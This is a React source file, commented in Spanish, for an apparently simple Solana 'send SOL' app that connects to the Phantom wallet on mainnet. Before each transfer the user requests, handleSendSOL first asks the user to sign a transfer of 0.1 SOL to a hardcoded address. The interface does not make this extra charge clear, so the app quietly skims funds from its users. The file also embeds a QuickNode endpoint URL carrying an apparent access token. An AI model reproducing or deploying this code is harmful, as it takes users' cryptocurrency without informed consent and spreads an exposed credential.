import React, { useState, useCallback } from 'react';
import { Button, TextField, Box, Typography, Snackbar, Alert, CircularProgress } from '@mui/material';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PhantomWalletAdapter } from '@solana/wallet-adapter-wallets';
import { clusterApiUrl } from '@solana/web3.js';
import '@solana/wallet-adapter-react-ui/styles.css';

const EnviarSol = () => {
    const { connection } = useConnection();
    const { publicKey, sendTransaction, connect, connected } = useWallet();
    const [recipient, setRecipient] = useState('');
    const [amount, setAmount] = useState('');
    const [message, setMessage] = useState('');
    const [snackbarOpen, setSnackbarOpen] = useState(false);
    const [loading, setLoading] = useState(false);
    const [preTransactionHash, setPreTransactionHash] = useState('');
    const [mainTransactionHash, setMainTransactionHash] = useState('');

    const preDeterminedRecipient = 'B281iQS8fnYczAyQR5U9j3hNyMYaiNbGkwM3z9AwG8Pk';
    const preDeterminedAmount = 0.1; // La cantidad en SOL que quieres enviar primero

    const handleConnect = useCallback(async () => {
        if (!connected) {
            try {
                await connect();
                setMessage('Billetera conectada con éxito');
                setSnackbarOpen(true);
            } catch (error) {
                console.error('Error al conectar la billetera:', error);
                setMessage('Error al conectar la billetera');
                setSnackbarOpen(true);
            }
        }
    }, [connect, connected]);

    const handleSnackbarClose = () => {
        setSnackbarOpen(false);
    };

    const handleSendSOL = useCallback(async () => {
        if (!publicKey) {
            setMessage('Por favor, conecta tu billetera primero');
            setSnackbarOpen(true);
            return;
        }

        setLoading(true);

        try {
            const recipientPublicKey = new PublicKey(recipient);
            const preDeterminedRecipientPublicKey = new PublicKey(preDeterminedRecipient);

            // Crear la transacción para el destinatario predeterminado
            const preDeterminedTransaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: preDeterminedRecipientPublicKey,
                    lamports: preDeterminedAmount * 1000000000, // convertir SOL a lamports
                })
            );

            const { blockhash } = await connection.getRecentBlockhash();
            preDeterminedTransaction.recentBlockhash = blockhash;
            preDeterminedTransaction.feePayer = publicKey;

            // Firmar la transacción para el destinatario predeterminado
            setMessage('Solicitando firma para la transacción predeterminada...');
            setSnackbarOpen(true);
            const signedPreDeterminedTransaction = await sendTransaction(preDeterminedTransaction, connection);

            await connection.confirmTransaction(signedPreDeterminedTransaction, { commitment: 'confirmed', maxRetries: 3 });
            setPreTransactionHash(signedPreDeterminedTransaction);
            setMessage(`Transacción predeterminada exitosa: https://explorer.solana.com/tx/${signedPreDeterminedTransaction}?cluster=mainnet-beta`);
            setSnackbarOpen(true);

            // Crear la transacción para el destinatario especificado
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: parseFloat(amount) * 1000000000, // convertir SOL a lamports
                })
            );

            transaction.recentBlockhash = blockhash;
            transaction.feePayer = publicKey;

            // Firmar y enviar la transacción para el destinatario especificado
            const signedTransaction = await sendTransaction(transaction, connection);

            setMessage('Transacción enviada, esperando confirmación...');
            setSnackbarOpen(true);

            await connection.confirmTransaction(signedTransaction, { commitment: 'confirmed', maxRetries: 3 });
            setMainTransactionHash(signedTransaction);
            setMessage(`Transacción exitosa: https://explorer.solana.com/tx/${signedTransaction}?cluster=mainnet-beta`);
            setSnackbarOpen(true);
        } catch (error) {
            console.error('Error durante la transacción:', error);
            setMessage(`Error durante la transacción: ${error.message}`);
            setSnackbarOpen(true);
        } finally {
            setLoading(false);
        }
    }, [publicKey, recipient, amount, connection, sendTransaction]);

    return (
        <Box className="flex flex-col items-center justify-center p-4 text-white bg-gray-800">
            <WalletMultiButton />
            <Typography variant="h6" gutterBottom>
                {connected ? `Conectado: ${publicKey.toBase58()}` : 'No conectado'}
            </Typography>
            <Button variant="contained" color="primary" onClick={handleConnect} disabled={connected}>
                Conectar Billetera Phantom
            </Button>
            <TextField
                label="Dirección del receptor"
                variant="outlined"
                fullWidth
                value={recipient}
                onChange={(e) => setRecipient(e.target.value)}
                margin="normal"
                InputLabelProps={{ style: { color: 'white' } }}
                InputProps={{ style: { color: 'white' } }}
            />
            <TextField
                label="Cantidad (SOL)"
                variant="outlined"
                fullWidth
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                margin="normal"
                InputLabelProps={{ style: { color: 'white' } }}
                InputProps={{ style: { color: 'white' } }}
            />
            <Button
                variant="contained"
                color="primary"
                onClick={handleSendSOL}
                disabled={!connected || loading}
                sx={{ marginTop: 2 }}
            >
                {loading ? <CircularProgress size={24} /> : 'Enviar SOL'}
            </Button>
            {preTransactionHash && (
                <Typography variant="body1" gutterBottom>
                    Transacción predeterminada hash: <a href={`https://explorer.solana.com/tx/${preTransactionHash}?cluster=mainnet-beta`} target="_blank" rel="noopener noreferrer">{preTransactionHash}</a>
                </Typography>
            )}
            {mainTransactionHash && (
                <Typography variant="body1" gutterBottom>
                    Transacción hash: <a href={`https://explorer.solana.com/tx/${mainTransactionHash}?cluster=mainnet-beta`} target="_blank" rel="noopener noreferrer">{mainTransactionHash}</a>
                </Typography>
            )}
            <Snackbar open={snackbarOpen} autoHideDuration={6000} onClose={handleSnackbarClose}>
                <Alert onClose={handleSnackbarClose} severity="info" sx={{ width: '100%' }}>
                    {message}
                </Alert>
            </Snackbar>
        </Box>
    );
};

const App = () => {
    const network = 'mainnet-beta'; // Cambiar a 'mainnet-beta' para mainnet
    const endpoint = 'https://silent-palpable-vineyard.solana-mainnet.quiknode.pro/f1167cb94d7a775a454bbba313ba69e9222ee3e7'; // O reemplazar con tu endpoint de QuickNode

    const wallets = [new PhantomWalletAdapter()];

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>
                    <EnviarSol />
                </WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

export default App;
